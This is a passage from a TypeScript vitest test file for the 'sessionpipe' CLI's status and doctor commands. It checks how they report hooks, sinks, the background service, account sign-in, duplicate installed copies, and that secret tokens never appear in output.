    expect(j.timing).toEqual({ n: 2, p50: 9, p95: 9 });
    expect(j.jobs).toBe(1);
    expect(j.harnesses["claude-code"]).toEqual([{ file: "~/.claude/settings.json", state: "current" }]);
    expect(j.harnesses["gemini-cli"][0]).toMatchObject({ state: "missing", note: expect.stringContaining("gemini") });
    expect(j.sinks.map((s: { pending_sessions: number }) => s.pending_sessions)).toEqual([2, 2, 0]);
  });

  it("the JSON: the same facts, and none of the keys", async () => {
    writeConfig({
      sinks: [{ name: "rx", url: "https://rx.invalid", tier: 2, token: "tok_hidden" }],
      harnesses: {},
    } as never);
    const { lines } = await run("status", "--json");
    const j = JSON.parse(lines.join("\n"));
    expect(j).toMatchObject({
      version: VERSION,
      state,
      config,
      harnesses: {},
      sinks: [
        {
          name: "rx",
          tier: 2,
          max_tier: null,
          pii: false,
          tools: "all",
          control: false,
          paused: null,
          pending_sessions: 0,
        },
      ],
      timing: null,
      control: null,
      jobs: 0,
    });
    expect(lines.join("\n")).not.toContain("tok_hidden");
  });

  it("with nothing set up it is all good: each group says what there is none of, and where events stay", async () => {
    const { lines } = await run("status");
    expect(lines).toEqual([
      "✓ All good",
      "",
      expect.stringMatching(new RegExp(`^ {2}✓ This computer {2}\\S+ \\(sessionpipe ${quoted(VERSION)}\\)$`)),
      "  · Agents         none: no coding agent was found on this computer",
      "  · Reports to     nowhere: events stay on this computer until you add a sink",
      "  · Messages from  nobody: this computer takes no messages",
      "  · Updates        by hand: this copy isn't a global npm install (npx, a checkout or a dev build)",
      "",
      "  `sessionpipe doctor` looks closer.",
    ]);
    expect(process.exitCode).toBeUndefined();
  });

  it("control health: not running, a receiver without the age field, one polling, one never polled", async () => {
    put(path.join(tmp, "config", "control.json"), {
      name: "box",
      folders: [],
      mode: "safe",
      receivers: [{ url: "https://rx.invalid", machine: "m", token: "t", keys: [] }],
    });
    const down = await run("status");
    expect(said(down, "This computer")).toMatch(/, background service: not running$/);
    expect(said(down, "Messages from")).toBe("✗ rx.invalid: not live: the background service isn't running");
    // The receivers the daemon answers about are this computer's own, and one more that
    // it has not taken up yet.
    put(path.join(tmp, "config", "control.json"), {
      name: "box",
      folders: ["/p"],
      mode: "auto",
      receivers: [
        { url: "https://a", machine: "m", token: "t", keys: [] },
        { url: "https://b", machine: "m", token: "t", keys: [{ id: "k1" }] },
        { url: "https://c", machine: "m", token: "t", keys: [{ id: "k1" }, { id: "k2" }] },
        { url: "https://rx.invalid", machine: "m", token: "t", keys: [] },
      ],
    });
    // The age of a poll with no age field is read off the clock: held still, it is exactly three minutes.
    holdClock();
    const now = Date.now();
    const close = await daemon({
      status: {
        op: "status",
        status: {
          version: VERSION,
          receivers: [
            { url: "https://a", polling: false, last_poll: now - 3 * 60_000, last_error: "401" },
            { url: "https://b", polling: true, last_poll: now, last_error: null, last_poll_age_ms: 10 },
            { url: "https://c", polling: true, last_poll: null, last_error: null },
          ],
        },
      },
    });
    try {
      const up = await run("status", "--json");
      const control = JSON.parse(up.lines.join("\n")).control;
      expect(control.running).toBe(true);
      expect(control.receivers[0].last_poll_age_ms).toBeGreaterThanOrEqual(3 * 60_000);
      expect(control.receivers[1].last_poll_age_ms).toBe(10);
      expect(control.receivers[2].last_poll_age_ms).toBeNull();
      // `status` names who is heard, and says what is wrong with who isn't.
      const brief = await run("status");
      expect(said(brief, "This computer")).toMatch(/, background service$/);
      expect(said(brief, "Messages from")).toBe("✗ a: not live for 3 min: 401, b, c");
      // Doctor has a row for each: since when, how many keys, and the one not taken up yet.
      steadyHook();
      vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
      onPlatform("darwin");
      const d = await run("doctor");
      expect(d.text).toContain("  ✓ background service  running\n");
      expect(group(d, "Messages from")).toEqual([
        "  ✗ a                     not live for 3 min: 401",
        "  ✓ b                     live · heard just now · 1 key trusted",
        "  ✓ c                     live · just connected · 2 keys trusted",
        "  · rx.invalid            the background service is taking it up · 0 keys trusted",
        "  · sessions you message  run in auto mode, in 1 folder",
      ]);
    } finally {
      await close();
    }
  });
});

describe.skipIf(process.platform === "win32")("doctor", () => {
  it("a healthy machine: every group, no warnings, all good once the stopped sink is seen to; the JSON says the same", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".claude-second", "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    writeConfig({
      sinks: [
        { name: "rx", url: "https://rx.invalid", tier: 2, max_tier: 3, token: "tok_secret" },
        { name: "kc", url: "https://kc.invalid", tier: 1, token_in: "keychain", paused: "HTTP 401" },
        { name: "out", url: "stdout", tier: 0 },
      ],
      harnesses: {},
    } as never);
    vi.mocked(sinkWithSecrets).mockImplementation((s) => ({ ...s, token: "x" }));
    await run("install", "--claude-code", "--backfill", "0");
    put(path.join(state, "timing.jsonl"), '{"ms":4}\n');
    // Each of the hook's eight timed runs takes 4 ms by this clock.
    let tick = 0n;
    vi.spyOn(process.hrtime, "bigint").mockImplementation(() => (tick += 4_000_000n));
    const { lines, text } = await run("doctor");
    expect(text).toMatch(
      new RegExp(`\\nThis computer\\n {2}✓ \\S+ +sessionpipe ${VERSION} · node ${process.version}\\n`),
    );
    expect(text).toContain("  · background service  not set up: nothing here needs it yet\n");
    expect(text).toContain(`  ✓ hooks               run sessionpipe ${VERSION}\n`);
    expect(text).toContain("  ✓ hook speed          4 ms each (95 in 100 under 4 ms)\n");
    expect(text).toContain("\nAgents\n  ✓ claude-code  hooked · ~/.claude/settings.json\n");
    expect(text).toContain("\nReports to\n  ✓ rx   tier 2 · up to date\n  ✗ kc   tier 1 · stopped: HTTP 401\n");
    expect(text).toContain("\nMessages from\n  · nobody  this computer takes no messages\n");
    expect(text).toContain("\nAccounts\n  ✓ Claude Code ~/.claude         signed in\n");
    // Nobody messages this computer, so a signed-out account is only said, not a thing to fix.
    expect(text).toContain("  · Claude Code ~/.claude-second  not signed in, as this shell sees it\n");
    expect(text).toContain("\nUpdates\n  · by hand  this copy isn't a global npm install");
    expect(text).not.toContain("tok_secret");
    // The one thing to do: the sink that stopped, with the command alone on its line.
    expect(lines[0]).toBe("! 1 thing needs attention");
    expect(fixes({ lines })).toEqual([
      "To fix",
      "  1. kc stopped taking events (HTTP 401); they wait on this computer. See what it answers now:",
      "       sessionpipe sink test kc",
    ]);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;

    const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    // What the page no longer spells out is still here for a program: where node and the
    // files are, each key's store, and the hook's two timings.
    expect(j.node_path).toEqual(expect.any(String));
    expect(j).toMatchObject({
      config,
      state,
      timing: { n: 1, p50: 4, p95: 4 },
      hook_wall_ms: { n: 8, p50: 4, p95: 4 },
    });
    expect(j).toMatchObject({
      version: VERSION,
      sinks: [
        { name: "rx", token: "tok_…" },
        { name: "kc", token: "in keychain" },
        { name: "out", token: null },
      ],
      keys: [
        { what: "sink rx", where: "file", readable: true },
        { what: "sink kc", where: "keychain", readable: true },
      ],
      claude_accounts: [{ signed_in: true }, { signed_in: false }],
      launcher: { node_ok: true, version: VERSION },
      warnings: [],
    });
    // --json exits 0 whatever it found, as it always has: a program reads `warnings`.
    expect(process.exitCode).toBeUndefined();

    // The sink takes events again: nothing left to fix, and the exit code says so.
    writeConfig({ ...cfg(), sinks: cfg().sinks.map(({ paused: _paused, ...sink }) => sink) } as never);
    const well = await run("doctor");
    expect(well.lines[0]).toBe("✓ All good");
    expect(well.text).toContain("  ✓ kc   tier 1 · up to date\n");
    expect(well.text).not.toContain("To fix");
    expect(process.exitCode).toBeUndefined();
  });

  it("warns: a stopped daemon, a stalled poll, a failed update, a locked key, a signed-out account, a Linux logout", async () => {
    steadyHook();
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".claude-second", "settings.json"), {});
    put(path.join(home, ".claude-odd", "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    put(path.join(tmp, "config", "control.json"), {
      name: "box",
      folders: [],
      mode: "safe",
      receivers: [
        { url: "https://rx.invalid", machine: "m", token_in: "keychain", keys: [] },
        { url: "https://plain.invalid", machine: "p", token: "t", keys: [] },
      ],
    });
    writeConfig({
      sinks: [{ name: "kc", url: "https://kc.invalid", tier: 1, token_in: "keychain" }],
      harnesses: {},
    } as never);
    vi.mocked(sinkWithSecrets).mockReturnValue(null);
    put(path.join(state, "control", "update.json"), {
      failed: { version: "9.9.9", at: "2026-10-01T00:00:00Z", error: "EACCES" },
    });
    onPlatform("linux");
    vi.mocked(execFileSync).mockReturnValue("Linger=no\n");
    const down = await run("doctor");
    const user = os.userInfo().username;
    // Each trouble is a row where it belongs, and a thing to do in the order to do it.
    expect(down.lines[0]).toBe("! 4 things need attention");
    expect(down.text).toContain("  ✗ background service  not running\n");
    expect(down.text).toContain("  ! after you log out   the background service stops\n");
    expect(down.text).toContain("  ✗ rx.invalid            not live: the background service isn't running\n");
    expect(down.text).toContain("  ✗ plain.invalid         not live: the background service isn't running\n");
    // A key in a store this shell can't open: the sink's own row says so, and it is no thing to fix.
    expect(group(down, "Reports to")).toEqual(["  ✓ kc  tier 1 · its key can't be read from this shell · up to date"]);
    expect(down.text).toContain("  ✓ Claude Code ~/.claude         signed in\n");
    expect(down.text).toContain(
      "  · Claude Code ~/.claude-odd     couldn't tell: `claude auth status` gave no answer\n",
    );
    expect(down.text).toContain("  ! Claude Code ~/.claude-second  not signed in, as this shell sees it\n");
    expect(down.text).toMatch(/\n {2}! failed {3}installing 9\.9\.9 \d+ days ago: EACCES\n/);
    expect(fixes(down)).toEqual([
      "To fix",
      "  1. The background service isn't running, so no message reaches this computer. Start it, and leave it running:",
      "       sessionpipe control run",
      "  2. The background service couldn't install sessionpipe 9.9.9 by itself. Do it now:",
      "       sessionpipe update",
      "  3. The background service stops when you log out of this computer. Keep it running (with sudo if refused):",
      `       loginctl enable-linger ${user}`,
      "  4. Claude Code ~/.claude-second isn't signed in, so a message can't start a session with it. Sign in:",
      "       CLAUDE_CONFIG_DIR=~/.claude-second claude auth login",
    ]);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    // A program is told the same in the words it always was, and where each key is.
    const jd = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(jd.warnings).toEqual(
      expect.arrayContaining([
        "the control daemon is not running or not responding; polling is stopped",
        expect.stringContaining(
          "the control daemon couldn't install sessionpipe 9.9.9: EACCES. It tries again tomorrow",
        ),
        expect.stringContaining("sink kc: its key is in the macOS Keychain, which this session can't read"),
        expect.stringContaining("control rx.invalid: its key is in the macOS Keychain, which this session can't read"),
        expect.stringMatching(/^Claude Code .*\.claude-second isn't signed in from here: `CLAUDE_CONFIG_DIR=/),
        expect.stringContaining(`the control daemon stops when you log out: \`loginctl enable-linger ${user}\``),
      ]),
    );
    expect(jd.keys).toEqual([
      { what: "sink kc", where: "keychain", readable: false },
      { what: "control rx.invalid", where: "keychain", readable: false },
      { what: "control plain.invalid", where: "file", readable: true },
    ]);
    expect(jd.claude_accounts).toEqual([
      { dir: "~/.claude", signed_in: true },
      { dir: "~/.claude-odd", signed_in: null },
      { dir: "~/.claude-second", signed_in: false },
    ]);
    expect(jd.launcher).toMatchObject({ node: null, node_ok: false });
    expect(jd.linger).toBe(false);

    vi.mocked(execFileSync).mockReturnValue("Linger=yes\n");
    const now = Date.now();
    const close = await daemon({
      status: {
        op: "status",
        status: {
          receivers: [
            { url: "https://a", polling: true, last_poll: now - 2 * 60_000, last_error: null },
            { url: "https://b", polling: false, last_poll: null, last_error: null },
            { url: "https://c", polling: true, last_poll: now, last_error: null, last_poll_age_ms: 0 },
          ],
        },
      },
    });
    try {
      const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
      expect(j.linger).toBe(true);
      expect(j.warnings).toContain("https://a: the daemon has not polled for 2 minutes: no successful poll response");
      expect(j.warnings).toContain("https://b: the daemon has never polled: polling stopped");
      expect(j.warnings.some((w: string) => w.startsWith("https://c"))).toBe(false);
      expect(j.warnings.some((w: string) => w.includes("stops when you log out"))).toBe(false);
    } finally {
      await close();
    }
    vi.mocked(execFileSync).mockImplementation(() => {
      throw new Error("no loginctl");
    });
    expect(JSON.parse((await run("doctor", "--json")).lines.join("\n")).linger).toBeNull();
  });

  it("warns about hooks a harness won't run, stale or misplaced ones, a slow hook, and a broken launcher", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".codex", "config.toml"), "");
    writeConfig({ sinks: [], harnesses: { "claude-code": { enabled: true } } } as never);
    vi.spyOn(claudeCode, "installed").mockReturnValue([
      { file: path.join(home, ".claude", "settings.json"), state: "inactive", note: "hooks are off" },
      { file: path.join(home, ".claude-second", "settings.json"), state: "inactive" },
      { file: path.join(home, ".claude", "settings.json"), state: "stale" },
    ]);
    vi.spyOn(codex, "installed").mockReturnValue([
      { file: path.join(home, ".codex", "config.toml"), state: "misplaced" },
    ]);
    let tick = 0n;
    vi.spyOn(process.hrtime, "bigint").mockImplementation(() => (tick += 200_000_000n));
    const { lines, text } = await run("doctor");
    // For a person: a row for each file in the agent's own words, and what to do, once.
    expect(lines[0]).toBe("! 5 things need attention");
    expect(text).toContain("  ! hooks               have no launcher to run\n");
    expect(text).toContain("  ! hook speed          200 ms each (95 in 100 under 200 ms)\n");
    expect(text).toContain(
      [
        "Agents",
        "  ! claude-code  hooks written, but the agent won't run them · ~/.claude/settings.json",
        "  ! claude-code  hooks written, but the agent won't run them · ~/.claude-second/settings.json",
        "  ! claude-code  hooks out of date · ~/.claude/settings.json",
        "  ! codex        hooked in a place the agent never reads · ~/.codex/config.toml",
        "",
      ].join("\n"),
    );
    expect(fixes({ lines })).toEqual([
      "To fix",
      "  1. The hooks have no launcher to run. Write them again from this copy:",
      "       sessionpipe install",
      // Hooks the agent won't run are its own setting's to mend: said with the reason, and no command.
      "  2. claude-code has its hooks and won't run them, so its sessions aren't reported: hooks are off.",
      "  3. claude-code has its hooks and won't run them, so its sessions aren't reported: its own settings turn hooks off.",
      "  4. The hooks for claude-code, codex are missing or out of date, so not every session is reported. Write them again:",
      "       sessionpipe install",
      "  5. Each hook takes 200 ms, which is Node starting up on this computer; agents wait that long many times a turn. With no sink above tier 0, fewer events are hooked.",
    ]);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    // For a program: each warning in the words it always had.
    const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(j.warnings).toEqual(
      expect.arrayContaining([
        "claude-code: hooks are written but the harness will not run them — hooks are off",
        "claude-code: hooks are written but the harness will not run them — ",
        expect.stringMatching(/^claude-code: the hook in .*settings\.json points at an old node or script path/),
        expect.stringMatching(/^codex: the notify line in .*config\.toml sits inside a \[table\]/),
        expect.stringContaining("the harness waits 200 ms per hook (p50, target < 150)"),
        "the hook launcher is missing; run `sessionpipe install` again",
      ]),
    );
    expect(j.launcher).toMatchObject({ file: expect.stringContaining("sessionpipe-hook"), node: null, node_ok: false });
  });

  it("names the hook set when a sink crossing tier 0 is why the hooks are stale", async () => {
    steadyHook();
    const file = path.join(home, ".claude", "settings.json");
    put(file, {});
    const bySet = (whenLean: "current" | "stale", otherFile = file) =>
      vi
        .spyOn(claudeCode, "installed")
        .mockImplementation(((_c: unknown, _e: unknown, o?: { lean?: boolean }) =>
          o?.lean
            ? [{ file, state: whenLean }]
            : [{ file: otherFile, state: whenLean === "stale" ? "current" : "stale" }]) as never);
    writeConfig({
      sinks: [{ name: "r", url: "https://r.invalid", tier: 2 }],
      harnesses: { "claude-code": { enabled: true } },
    } as never);
    // Which set, and why, is the warning a program reads; a person is told the hooks are
    // out of date and to write them again.
    const warned = async (): Promise<string> =>
      (JSON.parse((await run("doctor", "--json")).lines.join("\n")).warnings as string[]).join("\n");
    bySet("current");
    expect(await warned()).toMatch(
      /^claude-code: the hooks in .*settings\.json are the lean set, but a sink is above tier 0 now; run `sessionpipe install` again/m,
    );
    const page = await run("doctor");
    expect(page.text).toContain("\nAgents\n  ! claude-code  hooks out of date · ~/.claude/settings.json\n");
    expect(fixes(page).slice(-2)).toEqual([
      "  2. The hooks for claude-code are missing or out of date, so not every session is reported. Write them again:",
      "       sessionpipe install",
    ]);
    writeConfig({ sinks: [], harnesses: { "claude-code": { enabled: true } } } as never);
    bySet("stale");
    expect(await warned()).toMatch(
      /are the full set, but no sink is above tier 0 now; run `sessionpipe install` again/,
    );
    // The other set read for a different file says nothing about this one: the path reading stands.
    bySet("stale", path.join(home, ".claude-second", "settings.json"));
    expect(await warned()).toMatch(/points at an old node or script path/);
  });

  it("a hook that can't be spawned, or fails: no wall clock; the in-process timing survives a bad line", async () => {
    vi.mocked(spawnSync).mockReturnValue({ status: 1, stdout: "", stderr: "" } as never);
    put(path.join(state, "timing.jsonl"), "garbage\n");
    onPlatform("win32");
    const failed = await run("doctor");
    expect(failed.text).toContain("  ! hook speed          the hook could not be started\n");
    expect(fixes(failed)).toEqual([
      "To fix",
      "  1. The hook that agents run could not be started from this copy. Write the hooks again:",
      "       sessionpipe install",
    ]);
    // No launcher on Windows, so no row for the hooks' own copy.
    expect(failed.text).not.toMatch(/^ {2}. hooks /m);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    const bad = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(bad).toMatchObject({ hook_wall_ms: null, timing: null });
    expect(bad).not.toHaveProperty("launcher");
    vi.mocked(spawnSync).mockImplementation(() => {
      throw new Error("EACCES");
    });
    put(path.join(state, "timing.jsonl"), '{"ms":-5}\n');
    const j = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(j.hook_wall_ms).toBeNull();
    expect(j.timing).toBeNull();
  });
});

describe.skipIf(process.platform === "win32")("doctor and status: every copy of sessionpipe on this computer", () => {
  /** Where a cli.js of this world leaves its mark if anything starts it: outside the home
   *  that is looked in. */
  const ran = () => path.join(tmp, "ran");
  let marks = 0;
  /** A package folder: what its package.json says it is, and a cli.js that tells on
   *  whoever runs it. */
  const pkg = (dir: string, version: string, name = "sessionpipe"): string => {
    put(path.join(dir, "package.json"), { name, version });
    put(
      path.join(dir, "dist", "cli.js"),
      `require("node:fs").writeFileSync(${JSON.stringify(path.join(ran(), `${++marks}`))}, process.argv.slice(2).join(" "));\n`,
    );
    return dir;
  };
  /** A published sessionpipe as npm installs one for every folder, with its bin link. */
  const install = (prefix: string, version: string): string => {
    const dir = pkg(path.join(prefix, "lib", "node_modules", "sessionpipe"), version);
    mkdirSync(path.join(prefix, "bin"), { recursive: true });
    symlinkSync(
      path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js"),
      path.join(prefix, "bin", "sessionpipe"),
    );
    return dir;
  };
  /** A checkout of sessionpipe, and someone's own link to it in `~/bin`. */
  const checkout = (): string => {
    const dir = pkg(path.join(home, "src", "sessionpipe"), "1.1.0");
    put(path.join(dir, "src", "cli.ts"), "");
    mkdirSync(path.join(home, "bin"), { recursive: true });
    symlinkSync(path.join(dir, "dist", "cli.js"), path.join(home, "bin", "sessionpipe"));
    return dir;
  };
  const onPath = (...dirs: string[]) => vi.stubEnv("PATH", dirs.join(path.delimiter));
  const json = async () => JSON.parse((await run("doctor", "--json")).lines.join("\n"));
  /** The warnings a program reads that are about copies, or about what typing starts. */
  const about = (j: { warnings: string[] }): string[] =>
    j.warnings.filter((w) => /copies of sessionpipe|copy of sessionpipe|Typing `sessionpipe`|on your PATH/.test(w));
  const NOT_FOUND = (bin: string) =>
    `${bin} is not on your PATH: add it, or \`sessionpipe\` is not found when you type it.`;

  beforeEach(() => {
    marks = 0;
    mkdirSync(ran());
    steadyHook();
    // Where this runner keeps its own Node says nothing of the home that is looked in; nor
    // does who started these tests (`npm test` and `npx vitest` say `npm_command` to all
    // they start, and the look passes a `node_modules/.bin` over where that is said).
    for (const k of [
      "npm_config_cache",
      "npm_config_prefix",
      "npm_command",
      "N_PREFIX",
      "NVM_DIR",
      "FNM_DIR",
      "ASDF_DATA_DIR",
      "VOLTA_HOME",
    ])
      vi.stubEnv(k, undefined as never);
  });

  it("looks in this home for real: one copy that is typed is nothing to say, a second is a thing to fix, one that is not whole is said as that", async () => {
    const local = install(path.join(home, ".local"), "1.0.0");
    expect((await run("status")).lines[0]).toBe("✓ All good");
    const well = await run("doctor");
    expect(well.lines[0]).toBe("✓ All good");
    expect(well.text).not.toMatch(/^ {2}. copies /m);
    // For a program: the one copy, whole, and what uses it; no word of how it answered.
    const one = await json();
    expect(one.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
    expect(about(one)).toEqual([]);

    const other = install(path.join(home, ".npm-global"), "0.9.0");
    const brief = await run("status");
    expect(brief.lines[0]).toBe("! 1 thing needs attention");
    expect(brief.text).toContain("copies: 1.0.0 in ~/.local (you type this); 0.9.0 in ~/.npm-global (nothing uses it)");
    const d = await run("doctor");
    expect(d.text).toMatch(
      row("!", "copies", "1.0.0 in ~/.local (you type this); 0.9.0 in ~/.npm-global (nothing uses it)"),
    );
    expect(fixes(d)).toEqual([
      "To fix",
      "  1. 2 copies of sessionpipe are on this computer, and one is enough. One command puts it right:",
      "       sessionpipe reinstall",
    ]);
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    const two = await json();
    expect(two.copies).toEqual([
      { dir: local, version: "1.0.0", whole: true, uses: ["typed"] },
      { dir: other, version: "0.9.0", whole: true, uses: [] },
    ]);
    for (const c of two.copies) expect(c).not.toHaveProperty("runs");
    expect(about(two)).toEqual([
      `2 copies of sessionpipe are on this computer (1.0.0 in ${local}; 0.9.0 in ${other}); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);

    // One copy again, and its cli.js is gone: not whole, read from the disk and said as that.
    rmSync(path.join(home, ".npm-global"), { recursive: true });
    rmSync(path.join(local, "dist", "cli.js"));
    const broken = await run("doctor");
    expect(broken.text).toMatch(
      row("!", "copies", "1.0.0 in ~/.local (its dist/cli.js is missing (an install that was cut off?))"),
    );
    expect(fixes(broken)).toEqual([
      "To fix",
      "  1. The copy of sessionpipe on this computer is not whole. One command puts it right:",
      "       sessionpipe reinstall",
    ]);
    expect(process.exitCode).toBe(1);
    const j = await json();
    expect(j.copies).toEqual([{ dir: local, version: "1.0.0", whole: false, uses: ["typed"] }]);
    expect(about(j)).toEqual([
      `the copy of sessionpipe on this computer is not whole (1.0.0 in ${local}: its dist/cli.js is missing (an install that was cut off?)); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);
    // Nothing outside this test's home was looked at: the copy these tests run from is no row.
    for (const seen of [one, two, j])
      expect(seen.copies.every((c: { dir: string }) => c.dir.startsWith(`${home}${path.sep}`))).toBe(true);
  });

  it("a folder an install left behind, and a link to a copy that is gone: each is said, and one command puts it right", async () => {
    const local = install(path.join(home, ".local"), "1.0.0");
    // npm's own leftover beside the copy: the same package, under the name npm moves one aside by.
    const aside = pkg(path.join(home, ".local", "lib", "node_modules", ".sessionpipe-a1B2c3D4"), "0.9.0");
    const d = await run("doctor");
    expect(d.text).toMatch(
      row(
        "!",
        "copies",
        "1.0.0 in ~/.local (you type this); a leftover in ~/.local (left behind by an install that was cut off)",
      ),
    );
    expect(fixes(d)[1]).toBe(
      "  1. 2 copies of sessionpipe are on this computer, and one is enough. One command puts it right:",
    );
    const two = await json();
    expect(two.copies).toEqual([
      { dir: local, version: "1.0.0", whole: true, uses: ["typed"] },
      { dir: aside, version: "0.9.0", whole: false, uses: [] },
    ]);
    expect(about(two)).toEqual([
      `2 copies of sessionpipe are on this computer (1.0.0 in ${local}; a leftover in ${aside}); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);
    // The leftover alone, and the link of the copy that is gone: nothing is whole here.
    rmSync(local, { recursive: true });
    const link = path.join(home, ".local", "bin", "sessionpipe");
    const gone = await run("doctor");
    expect(gone.text).toMatch(
      row(
        "!",
        "copies",
        "a leftover in ~/.local (left behind by an install that was cut off); ~/.local/bin/sessionpipe, a link to one that is gone",
      ),
    );
    expect(fixes(gone).slice(1)).toEqual([
      "  1. The copy of sessionpipe on this computer is not whole. One command puts it right:",
      "       sessionpipe reinstall",
    ]);
    expect(about(await json())).toEqual([
      `the copy of sessionpipe on this computer is not whole (a leftover in ${aside}: left behind by an install that was cut off; ${link} is a link to one that is gone); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);
    // The link alone: no copy to list, and still one thing to put right.
    rmSync(aside, { recursive: true });
    const bare = await json();
    expect(bare.copies).toEqual([]);
    expect(about(bare)).toEqual([
      `the copy of sessionpipe on this computer is not whole (${link} is a link to one that is gone); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);
    expect((await run("doctor")).text).toMatch(
      row("!", "copies", "~/.local/bin/sessionpipe, a link to one that is gone"),
    );
  });

  it("an npx cache entry nothing uses is npm's cache, not a second copy: nothing to say", async () => {
    const local = install(path.join(home, ".local"), "1.0.0");
    pkg(path.join(home, ".npm", "_npx", "0a1b2c3d4e5f", "node_modules", "sessionpipe"), "0.9.0");
    const j = await json();
    expect(j.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
    expect(about(j)).toEqual([]);
    expect((await run("doctor")).text).not.toMatch(/^ {2}. copies /m);
  });

  it("M4: doctor and status run nothing they find: every copy is read, and no cli.js is started, whatever the proof says of its folder", async () => {
    // The copy that is typed and that the proof accepts: the one `reinstall` may ask for
    // its version, and doctor may not.
    const local = install(path.join(home, ".local"), "1.0.0");
    const stray = install(path.join(home, ".npm-global"), "0.9.0");
    // A folder of the name in a prefix that is looked in, whose package.json says it is
    // another package; an npx cache entry; a checkout someone linked onto PATH.
    const other = pkg(
      path.join(home, ".nvm", "versions", "node", "v22.1.0", "lib", "node_modules", "sessionpipe"),
      "3.0.0",
      "left-pad",
    );
    const cached = pkg(path.join(home, ".npm", "_npx", "0a1b2c3d4e5f", "node_modules", "sessionpipe"), "0.8.0");
    const linked = checkout();
    onPath(path.join(home, ".local", "bin"), path.join(home, "bin"));
    const found = [local, stray, other, cached, linked];
    // The tell-tale is live: started by hand, a cli.js of this world leaves its mark.
    const real = await vi.importActual<typeof import("node:child_process")>("node:child_process");
    real.spawnSync(process.execPath, [path.join(stray, "dist", "cli.js"), "--version"]);
    expect(readdirSync(ran())).toHaveLength(1);
    expect(readFileSync(path.join(ran(), readdirSync(ran())[0] as string), "utf8")).toBe("--version");
    rmSync(ran(), { recursive: true });
    mkdirSync(ran());

    const brief = await run("status");
    const page = await run("doctor");
    const j = await json();
    // What it says, it read: each release is its package.json's.
    const said = "1.0.0 in ~/.local (you type this); 0.9.0 in ~/.npm-global (nothing uses it)";
    expect(brief.text).toContain(`copies: ${said}`);
    expect(page.text).toMatch(row("!", "copies", said));
    expect(j.copies).toEqual([
      { dir: local, version: "1.0.0", whole: true, uses: ["typed"] },
      { dir: stray, version: "0.9.0", whole: true, uses: [] },
    ]);
    // The look each of the three took was handed no way to run a copy.
    expect(vi.mocked(look)).toHaveBeenCalledTimes(3);
    for (const [o] of vi.mocked(look).mock.calls) {
      expect(o).not.toHaveProperty("runs");
      expect(o.npmPrefix).toBeNull();
    }
    // And it found every one of them: the folders that are no install are in what it answered.
    const answered = vi.mocked(look).mock.results.at(-1)?.value as Inventory | undefined;
    expect(answered?.copies.map((c) => c.dir).sort()).toEqual([...found].sort());
    // Nothing was started but the hook doctor times: no `--version`, no file of any copy.
    const started = [...vi.mocked(spawnSync).mock.calls, ...vi.mocked(execFileSync).mock.calls].map((c) =>
      [c[0], ...((Array.isArray(c[1]) ? c[1] : []) as string[])].join(" "),
    );
    expect(started.some((s) => s.includes("hook.js"))).toBe(true);
    expect(started.filter((s) => s.includes("--version") || found.some((dir) => s.includes(dir)))).toEqual([]);
    expect(readdirSync(ran())).toEqual([]);
  });

  it("M3: what typing starts is said where it is no installed copy: a checkout linked first on PATH: a row, a warning, and a thing to fix that has no command", async () => {
    checkout();
    onPath(path.join(home, "bin"), path.join(home, ".local", "bin"));
    const sentence = "Typing `sessionpipe` starts ~/src/sessionpipe, which is no installed copy of it.";
    const d = await run("doctor");
    expect(d.text).toMatch(row("!", "copies", sentence));
    // It is a finding, so this computer is not "All good": it is counted, and said among
    // what is to fix, in `reinstall`'s own words for it. There is nothing to type for it:
    // no command under the sentence, `sessionpipe reinstall` is not named, and the exit
    // code is left alone (doctor exits 1 only where there is a command to run).
    expect(d.lines[0]).toBe("! 1 thing needs attention");
    expect(fixes(d)).toEqual(["To fix", `  1. ${sentence}`]);
    expect(d.text).not.toContain("sessionpipe reinstall");
    expect(process.exitCode).toBeUndefined();
    const brief = await run("status");
    expect(brief.lines[0]).toBe("! 1 thing needs attention");
    expect(said(brief, "This computer")).toMatch(new RegExp(`^! .*, copies: ${quoted(sentence)}$`));
    expect(brief.lines.at(-1)).toBe("  `sessionpipe doctor` says what to do about it.");
    const j = await json();
    expect(j.copies).toEqual([]);
    expect(about(j)).toEqual([sentence]);

    // With two installed copies beside it: one row, the copies first and the sentence
    // after them, and now there is a command, the one that leaves one copy.
    const local = install(path.join(home, ".local"), "1.0.0");
    const other = install(path.join(home, ".npm-global"), "0.9.0");
    const both = await run("doctor");
    expect(both.text).toMatch(
      row("!", "copies", `1.0.0 in ~/.local (nothing uses it); 0.9.0 in ~/.npm-global (nothing uses it); ${sentence}`),
    );
    expect(both.text.match(/^ {2}. copies /gm)).toHaveLength(1);
    // Two things to fix: the one with a command first, then what is typed, which
    // `reinstall` will say again (it leaves what is typed alone).
    expect(both.lines[0]).toBe("! 2 things need attention");
    expect(fixes(both)).toEqual([
      "To fix",
      "  1. 2 copies of sessionpipe are on this computer, and one is enough. One command puts it right:",
      "       sessionpipe reinstall",
      `  2. ${sentence}`,
    ]);
    expect(process.exitCode).toBe(1);
    expect(about(await json())).toEqual([
